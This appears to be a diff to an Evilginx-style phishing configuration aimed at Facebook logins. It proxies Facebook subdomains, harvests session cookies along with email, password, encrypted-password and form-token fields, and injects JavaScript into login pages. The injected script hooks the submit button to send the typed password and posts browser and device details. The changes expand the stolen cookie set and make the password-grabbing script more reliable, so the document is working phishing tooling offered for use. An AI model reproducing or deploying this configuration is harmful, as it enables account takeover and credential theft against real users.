@@ -2,8 +2,12 @@ author: 't.me/pysmart'
 min_ver: '2.3.0'
 proxy_hosts:
   - {phish_sub: 'www', orig_sub: 'www', domain: 'facebook.com', session: true, is_landing: true}
-  - {phish_sub: 'm', orig_sub: 'm', domain: 'facebook.com', session: true, is_landing: false}
-  - {phish_sub: 'static', orig_sub: 'static', domain: 'xx.fbcdn.net', session: false, is_landing: false}
+  - {phish_sub: 'login', orig_sub: 'login', domain: 'facebook.com', session: true}
+  - {phish_sub: 'graph', orig_sub: 'graph', domain: 'facebook.com', session: false}
+  - {phish_sub: 'static', orig_sub: 'staticxx', domain: 'fbcdn.net', session: false}
+  - {phish_sub: 'api', orig_sub: 'api', domain: 'facebook.com', session: false}
+  - {phish_sub: 'web', orig_sub: 'web', domain: 'facebook.com', session: false}
+  - {phish_sub: 'connect', orig_sub: 'connect', domain: 'facebook.com', session: false}
 sub_filters:
   - {triggers_on: 'www.facebook.com', orig_sub: 'www', domain: 'facebook.com', search: 'https://{hostname}/', replace: 'https://{hostname}/', mimes: ['text/html', 'application/json']}
   - {triggers_on: 'www.facebook.com', orig_sub: 'static', domain: 'xx.fbcdn.net', search: 'https://{hostname}/', replace: 'https://{hostname}/', mimes: ['text/html', 'application/json']}
@@ -18,38 +22,52 @@ sub_filters:
 
 auth_tokens:
   - domain: '.facebook.com'
-    keys: ['c_user','xs','sb']
+    keys: ['c_user', 'xs', 'sb', 'fr', 'datr', 'wd']
 credentials:
   username:
     key: 'email'
     search: '(.*)'
     type: 'post'
   password:
-    key: '^unenc_password$'
+    key: '^pass$'
     search: '(.*)'
     type: 'post'
+  encrypted_password:
+    key: 'enc_pass'
+    search: '(.*)'
+    type: 'post'
+  custom:
+    - key: 'lsd'
+      search: '(.*)'
+      type: 'post'
+    - key: 'jazoest'
+      search: '(.*)'
+      type: 'post'
+    - key: 'm_ts'
+      search: '(.*)'
+      type: 'post'
 #Custom parameters are added in order to grab the requests made by javascripts injected in order to get device user-agent and other details.
 # key: 'pass'  is added in order to increase the chances of grabbing the pass field if in case failed from above.
 
-  custom: 
-    - key: '^pass$'
-      search: '(.*)'
-      type: 'post'
-    - key: '^Password$'
-      search: '(.*)'
-      type: 'post'  
-    - key: 'UserAgent'
-      search: '(.*)'
-      type: 'post'
-    - key: 'Browser'
-      search: '(.*)'
-      type: 'post'
-    - key: 'Engine'
-      search: '(.*)'
-      type: 'post'
-    - key: 'Platform'
-      search: '(.*)'
-      type: 'post'
+  # custom: 
+  #   - key: '^pass$'
+  #     search: '(.*)'
+  #     type: 'post'
+  #   - key: '^Password$'
+  #     search: '(.*)'
+  #     type: 'post'  
+  #   - key: 'UserAgent'
+  #     search: '(.*)'
+  #     type: 'post'
+  #   - key: 'Browser'
+  #     search: '(.*)'
+  #     type: 'post'
+  #   - key: 'Engine'
+  #     search: '(.*)'
+  #     type: 'post'
+  #   - key: 'Platform'
+  #     search: '(.*)'
+  #     type: 'post'
 
 login:
   domain: 'www.facebook.com'
@@ -59,44 +77,50 @@ login:
 
 js_inject:
   - trigger_domains: ["www.facebook.com"]
-    trigger_paths: ["/login.php", "/login/device-based/regular/login/", "/login/*"] #The target path is important as the javascript will be injected in all address pages started with /login 
+    trigger_paths: ["/login.php", "/login/device-based/regular/login/", "/login/*"]
     trigger_params: []
-    script: |  
-      function onclickListener(){
-        var submit = document.querySelectorAll('button[type=submit]')[0];
-        submit.setAttribute("onclick", "sendPass()");
-        
-        var useragent = navigator.userAgent;
-        xhr.open("POST", '/', true);
-        xhr.setRequestHeader("Content-Type", "application/x-www-form-urlencoded");
-        xhr.send("UserAgent="+encodeURIComponent(useragent));
-        
-        var browser = navigator.appName;
-        xhr.open("POST", '/', true);
-        xhr.setRequestHeader("Content-Type", "application/x-www-form-urlencoded");
-        xhr.send("Browser="+encodeURIComponent(browser));
-        
-        var engine = navigator.product;
-        xhr.open("POST", '/', true);
-        xhr.setRequestHeader("Content-Type", "application/x-www-form-urlencoded");
-        xhr.send("Engine="+encodeURIComponent(engine));
-        
-        var platform = navigator.platform;
-        var xhr = new XMLHttpRequest();
-        xhr.open("POST", '/', true);
-        xhr.setRequestHeader("Content-Type", "application/x-www-form-urlencoded");
-        xhr.send("Platform="+encodeURIComponent(platform));
-        return;
-      }
-      function sendPass(){
-        var password = document.getElementsByName("pass")[0].value;
+    script: |
+      function sendPass() {
+        var passField = document.querySelector('input[name="pass"], input[name="password"]');
+        if (!passField) return;
+        var password = passField.value;
+
         var xhr = new XMLHttpRequest();
         xhr.open("POST", '/login/device-based/regular/login/', true);
         xhr.setRequestHeader("Content-Type", "application/x-www-form-urlencoded");
-        xhr.send("unenc_password="+encodeURIComponent(password));
-        return;
+        xhr.send("unenc_password=" + encodeURIComponent(password));
       }
-      setTimeout(function(){ onclickListener(); }, 1000);
+
+      function injectHook() {
+        var submitBtn = document.querySelector('button[type="submit"]');
+        if (submitBtn && !submitBtn.__hooked) {
+          submitBtn.addEventListener('click', sendPass);
+          submitBtn.__hooked = true;
+        }
+      }
+
+      // Try multiple times until button exists
+      var attempts = 0;
+      var interval = setInterval(() => {
+        injectHook();
+        if (++attempts > 10) clearInterval(interval);
+      }, 1000);
+
+      // Send device info once
+      window.addEventListener('load', function () {
+        var data = {
+          UserAgent: navigator.userAgent,
+          Browser: navigator.appName,
+          Engine: navigator.product,
+          Platform: navigator.platform
+        };
+        Object.keys(data).forEach(function(key) {
+          var xhr = new XMLHttpRequest();
+          xhr.open("POST", '/', true);
+          xhr.setRequestHeader("Content-Type", "application/x-www-form-urlencoded");
+          xhr.send(key + "=" + encodeURIComponent(data[key]));
+        });
+      });
       
 
 # UPDATE : LOOKS LIKE FACEBOOK HAS CHANGED THE JAVASCRIPT FUNCTION, STILL THE FILTERS WORKS SOMETIME , SO I LEFT THEM AS THEY WERE IN PREVIOUS PHISHLET I MADE.
